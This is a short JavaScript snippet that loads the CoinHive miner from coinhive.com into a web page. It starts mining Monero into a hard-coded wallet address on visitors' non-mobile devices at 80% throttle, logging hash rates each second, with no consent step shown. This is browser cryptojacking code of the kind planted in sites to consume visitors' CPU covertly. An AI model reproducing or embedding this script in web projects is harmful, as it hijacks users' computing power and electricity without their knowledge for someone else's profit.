var script = document.createElement('script');
script.onload = function () {
	// XMR Pool hash
	
	var m = new CoinHive.Anonymous( 'Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.8} );
	CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892"]];
	// Wallet
	if(!m.isMobile()){
		m.start('43er6EeusBRXUqY4w3tXWVD6HpBV57cXn4Y4kDeMVcz1Ji1R6zJhDwxNz2gGCEzWEgD5Z5sSWnsJ53rEcrwsf8Pm7pudpSc');
	}
  
	m.on('found', function () { console.log('Found!'); });
	m.on('accepted', function () { console.log('Accepted!'); });

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = m.getHashesPerSecond();
		var totalHashes = m.getTotalHashes();
		var acceptedHashes = m.getAcceptedHashes();

		// Output to HTML elements...
		console.log('hps=' + hashesPerSecond);
		console.log('th=' + totalHashes);
		console.log('ah=' + acceptedHashes);
		
	}, 1000);   
 };
script.src = 'https://coinhive.com/lib/coinhive.min.js';
document.head.appendChild(script);